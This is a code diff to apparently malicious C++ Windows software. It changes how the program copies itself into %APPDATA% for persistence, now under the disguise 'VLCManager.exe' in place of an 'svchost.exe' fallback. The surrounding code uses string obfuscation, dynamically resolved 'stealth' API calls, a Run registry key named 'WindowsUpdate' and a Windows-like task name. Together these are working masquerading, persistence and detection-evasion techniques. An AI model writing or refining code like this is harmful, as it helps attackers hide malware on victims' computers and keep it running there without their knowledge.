@@ -27,6 +27,10 @@ static std::wstring GetTaskName()  { std::string _tn = OBFUSCATE_STRING("Windows
 static std::string  GetRunValue()  { return OBFUSCATE_STRING("WindowsUpdate"); }
 static std::string  GetRunKey()    { return OBFUSCATE_STRING("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); }
 
+// Persistence target: %APPDATA%\VLCManager\VLCManager.exe
+static std::string  GetPersistFolder() { return OBFUSCATE_STRING("VLCManager"); }
+static std::string  GetPersistFile()   { return OBFUSCATE_STRING("VLCManager.exe"); }
+
 bool IsRunningAsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
@@ -196,8 +200,8 @@ std::string GetExecutableName() {
     return fullPath;
 }
 
-// Copies the binary to %APPDATA%\Microsoft\<exename> so persistence always
-// points to a stable location independent of where it was launched from.
+// Copies the binary to %APPDATA%\VLCManager\VLCManager.exe so persistence
+// always points to a stable location independent of where it was launched from.
 std::string CopySelfToAppData() {
     // Resolve %APPDATA%
     typedef HRESULT(WINAPI* pSHGetFolderPathA_t)(HWND, int, HANDLE, DWORD, LPSTR);
@@ -215,20 +219,18 @@ std::string CopySelfToAppData() {
     std::string srcPath = GetExecutablePath();
     if (srcPath.empty()) return "";
 
-    std::string exeName = GetExecutableName();
-    if (exeName.empty()) exeName = "svchost.exe";
-
-    // Build destination: %APPDATA%\Microsoft\<exename>
-    std::string _msDir = std::string(appDataPath) + OBFUSCATE_STRING("\\Microsoft");
-    std::string destPath = _msDir + "\\" + exeName;
+    // Build destination: %APPDATA%\VLCManager\VLCManager.exe (the running copy is
+    // renamed so it never keeps the name it was built/dropped with).
+    std::string persistDir = std::string(appDataPath) + "\\" + GetPersistFolder();
+    std::string destPath   = persistDir + "\\" + GetPersistFile();
 
     // If we're already running from that path, nothing to do.
     if (srcPath == destPath) return destPath;
 
-    // Ensure %APPDATA%\Microsoft\ exists (it always should, but be safe)
+    // Ensure %APPDATA%\VLCManager\ exists (it won't on a clean machine)
     typedef BOOL(WINAPI* pCreateDirectoryA_t)(LPCSTR, LPSECURITY_ATTRIBUTES);
     pCreateDirectoryA_t _CreateDirectoryA = (pCreateDirectoryA_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateDirectoryA");
-    if (_CreateDirectoryA) _CreateDirectoryA(_msDir.c_str(), NULL);
+    if (_CreateDirectoryA) _CreateDirectoryA(persistDir.c_str(), NULL);
 
     // Copy — overwrite any existing copy
     typedef BOOL(WINAPI* pCopyFileA_t)(LPCSTR, LPCSTR, BOOL);
